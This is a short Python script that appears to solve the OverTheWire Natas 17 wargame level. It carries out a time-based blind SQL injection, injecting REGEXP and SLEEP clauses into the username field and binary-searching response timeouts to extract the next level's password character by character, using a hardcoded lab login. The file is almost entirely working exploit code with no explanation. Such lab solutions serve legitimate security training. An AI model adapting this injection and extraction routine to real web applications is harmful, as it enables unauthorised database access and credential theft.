#!/bin/python3
import requests
import sys
import string

char = string.digits+string.ascii_uppercase+string.ascii_lowercase
MAX = len(char)
password_len = 32

url = 'http://natas17.natas.labs.overthewire.org/index.php'
qstr_head = "natas18\" AND password COLLATE latin1_general_cs REGEXP \"^"
qstr_tail = "\" AND (SLEEP(5)) AND \"1\"=\"1"

def isMatch(values):
	try:
		r = requests.post(url,auth=('natas17','XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'),data=values,timeout=5)
		return False
	except:
		return True

def binarySearch(start, end, current):
	if start == (end - 1):
		return char[start]

	mid = (start + end) // 2
	testStr = char[start:mid]

	qstr = qstr_head + current + '[' + testStr + ']' + qstr_tail
	values = {'username' : qstr}

	if isMatch(values):
		return binarySearch(start, mid, current)
	return binarySearch(mid, end, current)		
	
		
def main():
	searchStr = ""

	for pos in range(password_len):
		searchStr += binarySearch(0, MAX, searchStr)
		print (searchStr)

	print ("done")

main()

